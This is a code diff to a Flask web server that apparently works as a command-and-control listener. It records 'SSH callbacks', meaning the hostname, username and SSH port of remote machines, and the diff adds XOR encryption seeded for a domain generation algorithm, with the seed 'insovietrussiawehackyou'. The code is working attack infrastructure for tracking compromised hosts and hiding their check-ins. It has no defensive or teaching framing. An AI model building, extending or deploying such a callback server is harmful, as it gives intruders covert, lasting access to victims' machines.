@@ -26,6 +26,14 @@ from pathlib import Path
 from functools import wraps
 import os
 
+# Import encryption utilities
+try:
+    from crypto_utils import CallbackCrypto
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+    print("[!] WARNING: crypto_utils not available - encrypted callbacks will not be supported")
+
 app = Flask(__name__)
 app.secret_key = os.getenv('SECRET_KEY', secrets.token_hex(32))
 
@@ -34,6 +42,15 @@ DB_PATH = os.getenv('DB_PATH', '/data/ssh_callbacks.db')
 API_KEY = os.getenv('API_KEY', secrets.token_urlsafe(32))
 PORT = int(os.getenv('PORT', 5000))
 SESSION_TIMEOUT = int(os.getenv('SESSION_TIMEOUT', 3600))  # 1 hour
+DGA_SEED = os.getenv('DGA_SEED', 'insovietrussiawehackyou')  # DGA seed for encryption
+
+# Initialize encryption system
+CALLBACK_CRYPTO = None
+if CRYPTO_AVAILABLE:
+    CALLBACK_CRYPTO = CallbackCrypto(seed=DGA_SEED, rotation_hours=24, algorithm="sha256")
+    print("[+] Callback encryption enabled (XOR + DGA)")
+    print(f"    Algorithm: SHA-256 + XOR")
+    print(f"    Key rotation: Every 24 hours")
 
 # Print API key on startup (only if generated)
 if 'API_KEY' not in os.environ:
@@ -349,7 +366,7 @@ def dashboard():
 
 @app.route('/api/register', methods=['POST'])
 def register_callback():
-    """Register SSH callback (API key authentication)"""
+    """Register SSH callback (API key authentication with optional encryption)"""
     try:
         data = request.get_json()
 
@@ -364,7 +381,42 @@ def register_callback():
         # Get client IP
         ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-        # Extract data
+        # Check if data is encrypted
+        is_encrypted = data.get('encrypted', False)
+
+        if is_encrypted:
+            # Decrypt encrypted data
+            if not CALLBACK_CRYPTO:
+                audit_log('DECRYPT_ERROR', details='Encryption not available on server')
+                return jsonify({
+                    'status': 'error',
+                    'message': 'Server does not support encrypted callbacks'
+                }), 500
+
+            encrypted_data = data.get('data', '')
+            decrypted_json = CALLBACK_CRYPTO.decrypt_callback(encrypted_data)
+
+            if not decrypted_json:
+                audit_log('DECRYPT_ERROR', details='Failed to decrypt callback data')
+                return jsonify({
+                    'status': 'error',
+                    'message': 'Failed to decrypt callback data - invalid key or corrupted data'
+                }), 400
+
+            # Parse decrypted data
+            try:
+                decrypted_data = json.loads(decrypted_json)
+            except json.JSONDecodeError:
+                audit_log('DECRYPT_ERROR', details='Decrypted data is not valid JSON')
+                return jsonify({
+                    'status': 'error',
+                    'message': 'Decrypted data is not valid JSON'
+                }), 400
+
+            # Use decrypted data
+            data = decrypted_data
+
+        # Extract data (works for both encrypted and unencrypted)
         hostname = data.get('hostname', 'unknown')
         username = data.get('username', 'unknown')
         ssh_port = data.get('ssh_port', 22)
